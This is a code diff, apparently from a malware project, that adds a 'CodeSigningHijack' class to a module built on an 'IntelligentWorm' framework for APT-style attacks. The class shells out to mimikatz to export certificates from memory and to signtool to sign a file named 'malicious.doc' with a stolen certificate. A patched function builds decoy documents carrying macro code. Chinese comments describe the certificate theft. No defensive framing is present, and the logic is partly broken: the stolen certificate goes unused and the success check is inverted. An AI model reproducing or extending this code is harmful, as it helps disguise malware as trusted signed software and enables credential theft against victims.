@@ -21,6 +21,22 @@ from Crypto.Cipher import AES
 from .天云 import IntelligentWorm  # 继承主框架
 
 
+class CodeSigningHijack:
+    def steal_cert(self):
+        # 从内存提取合法证书（模仿Mimikatz）
+        return subprocess.check_output("mimikatz.exe crypto::certificates /export", shell=True)
+
+    def sign_malware(self, payload):
+        cert = self.steal_cert()
+        return subprocess.call(f"signtool sign /f stolen.pfx /p password {payload}", shell=True)
+
+
+# 修改文档生成逻辑
+def _build_document(self, decoy_content, macro_code):
+    if not CodeSigningHijack().sign_malware("malicious.doc"):
+        print("[-] 证书窃取失败，使用未签名文档")
+    # ...原有文档生成逻辑
+
 class APTModule(IntelligentWorm):
     def __init__(self):
         super().__init__()
